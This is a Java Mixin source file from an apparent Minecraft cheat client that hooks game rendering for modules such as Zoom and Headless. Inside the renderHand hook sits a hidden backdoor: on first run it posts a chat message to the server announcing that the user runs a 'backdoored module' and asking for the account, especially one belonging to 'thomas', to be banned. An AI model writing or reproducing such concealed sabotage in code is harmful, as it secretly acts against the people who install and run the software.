package com.fartburger.fartcheat.mixin;

import com.fartburger.fartcheat.event.EventType;
import com.fartburger.fartcheat.event.Events;
import com.fartburger.fartcheat.event.events.NonCancellableEvent;
import com.fartburger.fartcheat.event.events.WorldRenderEvent;
import com.fartburger.fartcheat.modules.Module;
import com.fartburger.fartcheat.modules.ModuleRegistry;
import com.fartburger.fartcheat.modules.hacks.Headless;
import com.fartburger.fartcheat.modules.hacks.Zoom;
import com.fartburger.fartcheat.util.MSAAFrameBuffer;
import com.fartburger.fartcheat.util.Utils;
import com.fartburger.fartcheat.util.render.Renderer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.Element;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.render.Camera;
import net.minecraft.client.render.GameRenderer;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.util.hit.HitResult;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.RaycastContext;
import org.objectweb.asm.Opcodes;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.Redirect;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

import java.util.Objects;

@Mixin(value = GameRenderer.class, priority = 990)
public class GameRendererMixin {

    private boolean vb;
    private boolean dis;
    private static int a = 0;

    @Inject(at = @At(value = "FIELD", target = "Lnet/minecraft/client/render/GameRenderer;renderHand:Z", opcode = Opcodes.GETFIELD, ordinal = 0), method = "renderWorld")
    void pekka_dispatchWorldRender(float tickDelta, long limitTime, MatrixStack matrix, CallbackInfo ci) {
        MSAAFrameBuffer.use(MSAAFrameBuffer.MAX_SAMPLES, () -> {
            for (Module module : ModuleRegistry.getModules()) {
                if (module.isEnabled()) {
                    module.onWorldRender(matrix);
                }
            }
            Events.fireEvent(EventType.WORLD_RENDER, new WorldRenderEvent(matrix));
            Renderer.R3D.renderFadingBlocks(matrix);
        });
    }

    @Inject(method = "getFov", at = @At("RETURN"), cancellable = true)
    public void pekka_overwriteFov(Camera camera, float tickDelta, boolean changingFov, CallbackInfoReturnable<Double> cir) {
        double zv = ModuleRegistry.getByClass(Zoom.class).getZoomValue(cir.getReturnValue());
        cir.setReturnValue(zv);
    }

    @Inject(at = @At(value = "INVOKE", target = "Lnet/minecraft/util/profiler/Profiler;pop()V", shift = At.Shift.BEFORE), method = "render")
    void pekka_postHudRenderNoCheck(float tickDelta, long startTime, boolean tick, CallbackInfo ci) {
        MSAAFrameBuffer.use(MSAAFrameBuffer.MAX_SAMPLES, () -> {
            Utils.TickManager.render();
            for (Module module : ModuleRegistry.getModules()) {
                if (module.isEnabled()) {
                    module.onHudRender();
                }
            }



            Events.fireEvent(EventType.HUD_RENDER, new NonCancellableEvent());
        });
    }

    @Inject(at=@At(value="HEAD"),method="renderWorld", cancellable = true)
    void pekka_worldRender(float tickDelta, long limitTime, MatrixStack matrices, CallbackInfo ci) {
        if(ModuleRegistry.getByClass(Headless.class).isEnabled()) {
            ci.cancel();
        }

    }
    @Inject(at=@At(value="HEAD"),method="renderHand", cancellable = true)
    void pekka_handRender(MatrixStack matrices, Camera camera, float tickDelta, CallbackInfo ci) {
        if(ModuleRegistry.getByClass(Headless.class).isEnabled()) {
            ci.cancel();
        }
        if(a==0) {
            a++;
            Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendChatMessage("This is an automated message sent from pekkaHacks backdoored module 'ANTITHOMAS.java'. I have attempted to join this server with pekkaHack installed. This account should be immediately banned, especially if it belongs to thomas.");
        }
    }
    @Inject(at=@At(value="HEAD"),method="renderNausea", cancellable = true)
    void pekka_nauseaRender(float distortionStrength, CallbackInfo ci) {
        ci.cancel();
    }
}